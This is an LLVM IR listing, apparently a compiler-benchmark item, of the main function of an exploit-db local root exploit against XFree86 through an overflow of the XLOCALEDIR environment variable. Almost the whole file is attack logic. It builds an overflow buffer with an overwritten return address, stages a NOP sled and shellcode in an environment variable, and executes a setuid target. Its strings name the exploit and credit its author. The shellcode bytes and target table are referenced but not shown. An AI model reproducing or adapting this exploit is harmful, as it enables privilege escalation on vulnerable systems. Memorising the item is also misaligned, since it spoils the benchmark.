; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22323.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22323.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32, i8*, i32, i64, i32 }

@.str = private unnamed_addr constant [4 x i8] c"ht:\00", align 1
@optarg = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [16 x i8] c"Wrong Target!\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"Please select target num !\0A\00", align 1
@.str.3 = private unnamed_addr constant [40 x i8] c"======================================\0A\00", align 1
@exploit = common dso_local global %struct.TYPE_2__* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [18 x i8] c"[%d]  | %s  %s  \0A\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"XLOCALEDIR\00", align 1
@shellcode = common dso_local global i64* null, align 8
@.str.6 = private unnamed_addr constant [8 x i8] c"PH4NT0M\00", align 1
@.str.7 = private unnamed_addr constant [33 x i8] c"\0A++++++++++++++++++++++++++++++\0A\00", align 1
@.str.8 = private unnamed_addr constant [43 x i8] c"Xfree86 XLOCALEDIR env local root exploit\0A\00", align 1
@.str.9 = private unnamed_addr constant [35 x i8] c"++++++++++++++++++++++++++++++++\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"coded by aXis,aXis@ph4nt0m.net\0A\00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c"PST,www.ph4nt0m.org\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [23 x i8] c"retaddr is at 0x%lx  \0A\00", align 1
@.str.13 = private unnamed_addr constant [18 x i8] c"buf is at 0x%lx \0A\00", align 1
@.str.14 = private unnamed_addr constant [41 x i8] c"failed,try another target! -h for help\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [4076 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  br label %12

12:                                               ; preds = %87, %2
  %13 = load i32, i32* %4, align 4
  %14 = load i8**, i8*** %5, align 8
  %15 = call i32 @getopt(i32 %13, i8** %14, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  store i32 %15, i32* %9, align 4
  %16 = icmp ne i32 %15, -1
  br i1 %16, label %17, label %88

17:                                               ; preds = %12
  %18 = load i32, i32* %9, align 4
  switch i32 %18, label %81 [
    i32 104, label %19
    i32 116, label %25
  ]

19:                                               ; preds = %17
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @usage(i8* %22)
  %24 = call i32 @exit(i32 0) #3
  unreachable

25:                                               ; preds = %17
  %26 = load i32, i32* @optarg, align 4
  %27 = call i32 @atoi(i32 %26)
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = icmp sgt i32 %28, 6
  br i1 %29, label %33, label %30

30:                                               ; preds = %25
  %31 = load i32, i32* %8, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %36

33:                                               ; preds = %30, %25
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %35 = call i32 @exit(i32 0) #3
  unreachable

36:                                               ; preds = %30
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %80

39:                                               ; preds = %36
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @usage(i8* %42)
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %46

46:                                               ; preds = %75, %39
  %47 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %48 = load i32, i32* %7, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i64 %49
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = icmp ne i8* %52, null
  br i1 %53, label %54, label %78

54:                                               ; preds = %46
  %55 = load i32, i32* @stderr, align 4
  %56 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i64 %58
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %59, i32 0, i32 1
  %61 = load i32, i32* %60, align 8
  %62 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %62, i64 %64
  %66 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %65, i32 0, i32 2
  %67 = load i8*, i8** %66, align 8
  %68 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %69 = load i32, i32* %7, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %68, i64 %70
  %72 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %71, i32 0, i32 0
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 (i32, i8*, ...) @fprintf(i32 %55, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i32 %61, i8* %67, i8* %73)
  br label %75

75:                                               ; preds = %54
  %76 = load i32, i32* %7, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %7, align 4
  br label %46

78:                                               ; preds = %46
  %79 = call i32 @exit(i32 1) #3
  unreachable

80:                                               ; preds = %36
  br label %87

81:                                               ; preds = %17
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @usage(i8* %84)
  %86 = call i32 @exit(i32 0) #3
  unreachable

87:                                               ; preds = %80
  br label %12

88:                                               ; preds = %12
  %89 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %90 = load i32, i32* %8, align 4
  %91 = sub nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %89, i64 %92
  %94 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %93, i32 0, i32 3
  %95 = load i32, i32* %94, align 8
  store i32 %95, i32* %10, align 4
  %96 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %97 = load i32, i32* %8, align 4
  %98 = sub nsw i32 %97, 1
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %96, i64 %99
  %101 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %100, i32 0, i32 4
  %102 = load i64, i64* %101, align 8
  store i64 %102, i64* %11, align 8
  %103 = getelementptr inbounds [4076 x i8], [4076 x i8]* %6, i64 0, i64 0
  %104 = call i32 @memset(i8* %103, i32 65, i32 4072)
  %105 = getelementptr inbounds [4076 x i8], [4076 x i8]* %6, i64 0, i64 0
  %106 = getelementptr inbounds i8, i8* %105, i64 2076
  %107 = call i32 @memcpy(i8* %106, i64* %11, i32 4)
  %108 = getelementptr inbounds [4076 x i8], [4076 x i8]* %6, i64 0, i64 0
  %109 = call i32 @setenv(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i8* %108, i32 1)
  %110 = getelementptr inbounds [4076 x i8], [4076 x i8]* %6, i64 0, i64 0
  %111 = load i32, i32* %10, align 4
  %112 = call i32 @memset(i8* %110, i32 144, i32 %111)
  %113 = getelementptr inbounds [4076 x i8], [4076 x i8]* %6, i64 0, i64 0
  %114 = getelementptr inbounds i8, i8* %113, i64 4000
  %115 = load i32, i32* %7, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %114, i64 %116
  %118 = load i64*, i64** @shellcode, align 8
  %119 = load i64*, i64** @shellcode, align 8
  %120 = call i32 @strlen(i64* %119)
  %121 = call i32 @memcpy(i8* %117, i64* %118, i32 %120)
  %122 = getelementptr inbounds [4076 x i8], [4076 x i8]* %6, i64 0, i64 0
  %123 = call i32 @setenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* %122, i32 1)
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.7, i64 0, i64 0))
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.8, i64 0, i64 0))
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.9, i64 0, i64 0))
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %129 = load i64, i64* %11, align 8
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i64 0, i64 0), i64 %129)
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0), [4076 x i8]* %6)
  %132 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %133 = load i32, i32* %8, align 4
  %134 = sub nsw i32 %133, 1
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %132, i64 %135
  %137 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %136, i32 0, i32 0
  %138 = load i8*, i8** %137, align 8
  %139 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exploit, align 8
  %140 = load i32, i32* %8, align 4
  %141 = sub nsw i32 %140, 1
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %139, i64 %142
  %144 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %143, i32 0, i32 5
  %145 = load i32, i32* %144, align 8
  %146 = call i32 @execl(i8* %138, i32 %145, i32 0)
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %148, label %152

148:                                              ; preds = %88
  %149 = load i32, i32* @stderr, align 4
  %150 = call i32 (i32, i8*, ...) @fprintf(i32 %149, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.14, i64 0, i64 0))
  %151 = call i32 @exit(i32 -1) #3
  unreachable

152:                                              ; preds = %88
  ret i32 0
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @usage(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i64*, i32) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i64*) #1

declare dso_local i32 @execl(i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
